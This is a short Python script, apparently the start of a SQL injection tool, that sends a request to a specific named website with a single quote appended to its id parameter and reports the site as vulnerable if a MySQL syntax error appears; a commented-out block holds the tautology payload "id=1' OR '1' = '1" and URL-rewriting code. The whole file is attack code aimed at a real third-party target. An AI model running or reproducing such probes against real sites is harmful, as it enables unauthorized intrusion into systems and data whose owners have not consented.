import urllib.request
from urllib.parse import urlparse,urlunparse
import sys
url ='http://achromicpoint.com/past-event.php?id=186'
#url = "https://dynamic-password.000webhostapp.com/index.php"
'''
new_query = "id=1' OR '1' = '1"
request = urllib.request.urlopen(url)
print(request.geturl())
#print(request.info())
parse = urlparse(url)
print(parse)
print('*'*80)
parse = parse._replace(query=new_query)
print(parse)
print('*'*80)
print(urlunparse(parse))
'''
resp = urllib.request.urlopen(url+"'")
body = resp.read() 
fullbody = body.decode('utf-8')
if "You have an error in your SQL syntax" in fullbody:
	print("The given url is vulnerable")
else:
	print("Not Vulnerable")
	sys.exit()

print("continue")
